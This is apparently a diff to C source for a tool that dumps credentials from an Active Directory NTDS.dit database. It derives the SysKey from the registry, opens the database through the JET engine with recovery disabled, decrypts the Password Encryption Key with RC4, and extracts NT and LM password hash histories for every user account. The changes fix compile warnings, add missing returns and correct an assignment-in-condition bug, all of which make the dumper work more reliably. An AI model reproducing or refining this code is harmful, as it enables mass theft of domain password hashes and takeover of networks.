@@ -20,12 +20,13 @@ BOOL get_syskey_component(HKEY lsaHandle, char subkeyName[255], unsigned char *t
 	if (regStatus != ERROR_SUCCESS){
 		return FALSE;
 	}
-	regStatus = RegQueryInfoKey(subkeyHandle, &tmpVal, &sizeData, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	regStatus = RegQueryInfoKey(subkeyHandle, (LPSTR)&tmpVal, &sizeData, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (regStatus != ERROR_SUCCESS){
 		return FALSE;
 	}
 	byteComponent = strtoimax(tmpVal, NULL, 16);
 	strncat(tmpSysKey, &byteComponent, 4);
+	return TRUE;
 }
 
 BOOL get_syskey(unsigned char *sysKey[17]){
@@ -83,7 +84,7 @@ JET_ERR engine_startup(jetState *ntdsState){
 		return jetError;
 	}
 	// Disable crash recovery and transaction logs
-	jetError = JetSetSystemParameter(&ntdsState->jetEngine, JET_sesidNil, JET_paramRecovery, NULL, "Off");
+	jetError = JetSetSystemParameter(&ntdsState->jetEngine, JET_sesidNil, JET_paramRecovery, (JET_API_PTR)NULL, "Off");
 	if (jetError != JET_errSuccess){
 		return jetError;
 	}
@@ -157,7 +158,7 @@ JET_ERR get_PEK(jetState *ntdsState, ntdsColumns *accountColumns, encryptedPEK *
 	JET_ERR readStatus;
 	unsigned char *encryptionKey[76];
 
-	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, NULL);
+	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, (JET_GRBIT)NULL);
 	if (cursorStatus != JET_errSuccess){
 		puts("Unable to set the cursor to the first index!");
 		return cursorStatus;
@@ -171,7 +172,7 @@ JET_ERR get_PEK(jetState *ntdsState, ntdsColumns *accountColumns, encryptedPEK *
 			puts("Found the Password Encryption Key");
 			return readStatus;
 		}
-		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
+		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, (JET_GRBIT)NULL);
 	} while (cursorStatus == JET_errSuccess);
 	return readStatus;
 }
@@ -226,7 +227,7 @@ BOOL decrypt_rc4(unsigned char *key1, unsigned char *key2, LPBYTE encrypted, int
 		puts("Failed to derive RC4 key");
 		return FALSE;
 	}
-	cryptOK = CryptEncrypt(rc4KeyFinal, NULL, TRUE, 0, encrypted, &lenBuffer, lenBuffer);
+	cryptOK = CryptEncrypt(rc4KeyFinal, (HCRYPTHASH)NULL, TRUE, 0, encrypted, &lenBuffer, lenBuffer);
 		if (!cryptOK){
 			puts("There was an error with the final RC4 decryption");
 			return FALSE;
@@ -336,7 +337,7 @@ JET_ERR read_table(jetState *ntdsState, ntdsColumns *accountColumns, decryptedPE
 	JET_ERR cursorStatus;
 	JET_ERR readStatus;	
 
-	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, NULL);
+	cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveFirst, (JET_GRBIT)NULL);
 	if (cursorStatus != JET_errSuccess){
 		puts("Unable to set the cursor to the first index!");
 		return cursorStatus;
@@ -365,7 +366,7 @@ JET_ERR read_table(jetState *ntdsState, ntdsColumns *accountColumns, decryptedPE
 		readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->accountType.columnid, &accountType, sizeof(accountType),columnSize,0,NULL);
 		// Unless this is a User Account, then we skip it
 		if (readStatus == JET_wrnColumnNull || accountType != 0x30000000){
-			cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
+			cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, (JET_GRBIT)NULL);
 			continue;
 		}
 		// If any other error has occured we've screwed up and need to fix it for now
@@ -511,7 +512,7 @@ JET_ERR read_table(jetState *ntdsState, ntdsColumns *accountColumns, decryptedPE
 			// If there's no NT history, there's no LM history
 			// Grab the LM History
 			readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->lmHistory.columnid, NULL, 0, &columnSize, 0, NULL);
-			if (readStatus = JET_wrnBufferTruncated){
+			if (readStatus == JET_wrnBufferTruncated){
 				LPBYTE encLMHist = (LPBYTE)malloc(columnSize);
 				readStatus = JetRetrieveColumn(ntdsState->jetSession, ntdsState->jetTable, accountColumns->lmHistory.columnid, encLMHist, columnSize, &columnSize, 0, NULL);
 				decrypt_hash_history(encLMHist, columnSize, pekDecrypted, userAccount->accountRID, &userAccount->lmHistory, &userAccount->numLMHistory);
@@ -525,12 +526,13 @@ JET_ERR read_table(jetState *ntdsState, ntdsColumns *accountColumns, decryptedPE
 			puts("No NT Hash History Stored");
 		}
 		dump_account(userAccount);
-		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, NULL);
+		cursorStatus = JetMove(ntdsState->jetSession, ntdsState->jetTable, JET_MoveNext, (JET_GRBIT)NULL);
 	} while (cursorStatus == JET_errSuccess);
 	if (cursorStatus != JET_errNoCurrentRecord){
 		puts("An error occured while moving the database cursor");
 		return cursorStatus;
 	}
+	return JET_errSuccess;
 }
 
 BOOL decrypt_PEK(unsigned char *sysKey[17], encryptedPEK *pekEncrypted, decryptedPEK *pekDecrypted){
